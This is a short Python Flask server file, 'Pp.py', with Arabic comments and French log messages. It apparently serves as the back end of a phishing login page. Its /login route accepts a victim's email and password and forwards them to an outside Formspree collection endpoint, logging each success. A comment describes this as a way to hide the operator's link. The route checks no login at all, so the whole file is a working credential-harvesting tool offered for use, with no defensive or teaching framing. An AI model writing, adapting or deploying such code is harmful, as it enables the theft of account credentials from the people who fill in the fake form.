# Pp.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app) # لتسهيل الاتصال بين واجهة الـ HTML والسيرفر

# رابط الـ Formspree الخاص بك
FORMSPREE_URL = "https://formspree.io/f/xojzprkz"

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    
    # تجهيز البيانات لإرسالها لـ Formspree
    payload = {
        "email": email,
        "password": password
    }
    
    try:
        # إرسال البيانات من السيرفر مباشرة لـ Formspree لحماية الرابط الخاص بك
        response = requests.post(FORMSPREE_URL, data=payload)
        if response.status_code == 200:
            print(f"[SUCCESS] Données envoyées avec succès pour: {email}")
            return jsonify({"status": "success", "message": "Données envoyées"}), 200
        else:
            print(f"[ERROR] Échec Formspree. Code statut: {response.status_code}")
            return jsonify({"status": "fail"}), response.status_code
            
    except Exception as e:
        print(f"[EXCEPTION] Une erreur est survenue: {str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    print("Le serveur backend est démarré sur http://localhost:5000")
    app.run(port=5000)
